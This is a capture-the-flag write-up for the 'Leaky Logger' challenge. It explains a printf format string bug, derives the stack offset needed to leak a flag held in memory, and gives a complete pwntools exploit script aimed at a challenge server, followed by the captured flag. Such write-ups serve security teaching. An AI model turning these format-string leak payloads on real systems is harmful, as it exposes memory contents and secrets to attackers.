---
title: "RSTCON 2026 CTF: Leaky Logger Writeup"
---

## Overview
"The RST Hydro event logger reads the flag into memory at startup, then offers to record one log line for you. It echoes that line back a little too literally."

```
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

---
## Vulnerability
The binary prompts the user to submit one log line and it will be recorded. After the input is recorded, it reports back and says "`logged: <record here>`". The call to `printf()` that lets the user know that it was logged is implemented insecurely, resulting in a format string vulnerability.

![Vulnerable Code Photo](/assets/images/rstcon2026/logger_vuln.png)

```
bird ➜ ~/Desktop/CTF $ ./logger
RST Hydro event logger.
Submit one log line and it will be recorded:
%p %p %p %p %p %p %p %p %p
logged: 0x7ffea379da70 (nil) (nil) 0x8 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025
```
- `0x7025207025207025` is `%p`


---
## Exploit Development
In order to use this to read the flag that is stored into memory, we need to inspect the stack to figure out the correct offset required to reach the flag.

To do this, I added a flag.txt file on my local machine for testing with the contents of `AAAAAAAA`. Next, I input `AAAA` when prompted what to record by the binary.

I then set a breakpoint after the input, and inspected the stack.

![Logger Debugging Photo](/assets/images/rstcon2026/logger_offset.png)

This gives 2 addresses, `0x7fffffffd950` which is where my input was stored, and `0x7fffffffdb50`, where the flag is stored. Subtracting the two gives the offset of `0x200` and dividing that by `8` results in `64`.

Since the first `printf` format specifiers are read from registers rather than the stack, `%1$p`–`%5$p` return register contents and the stack only begins at `%6$p`. Adding that base to the 64 slot distance gives `6 + 64 = 70`, so `%70$p` would result in leaking the contents of the flag. When I tested the vulnerability, you can see these random values come into play in the Vulnerability section.

---
## Final Pwn
During testing, I would only partially get the flag, because I was only passing `%70$p`. This makes sense because it would only return `8` bytes since it would read only 1 memory address at a time, and the flag was longer. The fix was to just add `%71$p`, `%72$p`, etc.

```python
from pwn import *

BINARY = './logger'
elf = context.binary = ELF(BINARY, checksec=False)
context.terminal = ['gnome-terminal', '--']
context.log_level = "info"

gdbscript="""
set debuginfod enabled off
b *main
continue

b *0x4013c6
"""

def start():
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote("18.215.143.250", 9002)
    return process([BINARY])

io = start()

io.sendlineafter("recorded:", b"%70$p %71$p %72$p %73$p %74$p %75$p %76$p")
io.recvuntil(b"logged:")
line = io.recvline()

# Optional flag decoding, can be done outside script
flag = b""
for token in line.split():
    value = int(token, 16) if token.startswith(b"0x") else 0
    flag += p64(value)

flag = flag.split(b"\x00")[0]
print(flag.decode())
```

```
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```